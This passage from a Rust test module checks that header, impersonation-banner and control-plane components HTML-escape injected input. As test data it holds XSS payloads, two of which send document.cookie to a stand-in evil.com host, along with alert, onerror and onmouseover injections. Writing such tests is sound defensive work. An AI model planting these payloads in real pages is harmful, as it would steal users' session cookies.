            search_query: xss_payload,
            unread_count: 0,
            avatar_fallback: "AM",
            mobile_menu_open: false,
        }
        .render_html();
        assert!(
            !header.contains(xss_payload),
            "raw XSS payload found in header output"
        );
    }

    #[test]
    fn header_avatar_escapes_xss() {
        let xss_payload = "\"><script>alert(1)</script>";
        let header = ShellHeader {
            search_query: "safe",
            unread_count: 0,
            avatar_fallback: xss_payload,
            mobile_menu_open: false,
        }
        .render_html();
        assert!(
            !header.contains("<script>"),
            "unescaped script tag in avatar output"
        );
        assert!(
            header.contains("&lt;script&gt;"),
            "escaped script tag not found"
        );
    }

    #[test]
    fn impersonation_banner_escapes_tenant_id() {
        let xss_payload =
            "<script>document.location='https://evil.com?c='+document.cookie</script>";
        let banner = ImpersonationBanner {
            tenant_id: xss_payload,
            operator_name: "Safe Operator",
            time_remaining: "5:00",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(
            !banner.contains("<script>"),
            "unescaped script in tenant_id"
        );
        assert!(
            banner.contains("&lt;script&gt;"),
            "escaped tenant_id not found"
        );
    }

    #[test]
    fn impersonation_banner_escapes_operator_name() {
        let xss_payload = "Admin<img/src=x onerror=alert(1)>";
        let banner = ImpersonationBanner {
            tenant_id: "safe_tenant",
            operator_name: xss_payload,
            time_remaining: "5:00",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(
            !banner.contains("onerror=alert(1)>"),
            "unescaped img tag in operator_name"
        );
    }

    #[test]
    fn impersonation_banner_escapes_error_message() {
        let xss_payload = "<div onmouseover=\"alert('xss')\">Error</div>";
        let banner = ImpersonationBanner {
            tenant_id: "safe_tenant",
            operator_name: "Admin",
            time_remaining: "5:00",
            end_session_error: Some(xss_payload),
            ending_session: false,
        }
        .render_html();
        // The angle brackets of the <div> tag must be escaped
        assert!(
            !banner.contains("<div onmouseover"),
            "unescaped <div> tag in error message"
        );
        assert!(
            banner.contains("&lt;div onmouseover="),
            "escaped error message not found"
        );
    }

    #[test]
    fn impersonation_banner_escapes_time_remaining() {
        let xss_payload = "\"><script>alert(1)</script><span x=\"";
        let banner = ImpersonationBanner {
            tenant_id: "safe_tenant",
            operator_name: "Admin",
            time_remaining: xss_payload,
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(
            !banner.contains("<script>alert(1)</script>"),
            "unescaped script in time_remaining"
        );
    }

    #[test]
    fn control_plane_banner_escapes_message() {
        let xss_payload =
            "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>";
        let control = ControlPlaneShell {
            mobile_menu_open: false,
            user_role: "admin",
            page_title: "Operations",
            page_description: "Monitor the fleet.",
            banners: vec![OperationalBanner {
                tone: "critical",
                message: xss_payload,
            }],
            child_html: "<section>Ops</section>",
            current_path: "/dashboard",
        }
        .render_html();
        assert!(
            !control.contains("<script>fetch"),
            "unescaped script in control plane banner"
        );
        assert!(
            control.contains("&lt;script&gt;"),
            "escaped banner message not found"
        );
    }

    #[test]
    fn html_escape_covers_all_dangerous_chars() {
        assert_eq!(html_escape("<"), "&lt;");
        assert_eq!(html_escape(">"), "&gt;");
        assert_eq!(html_escape("&"), "&amp;");
        assert_eq!(html_escape("\""), "&quot;");
        assert_eq!(html_escape("'"), "&#x27;");
        assert_eq!(html_escape("safe text 123"), "safe text 123");
        assert_eq!(
            html_escape("<script>alert('xss')</script>"),
            "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"
        );
    }
}
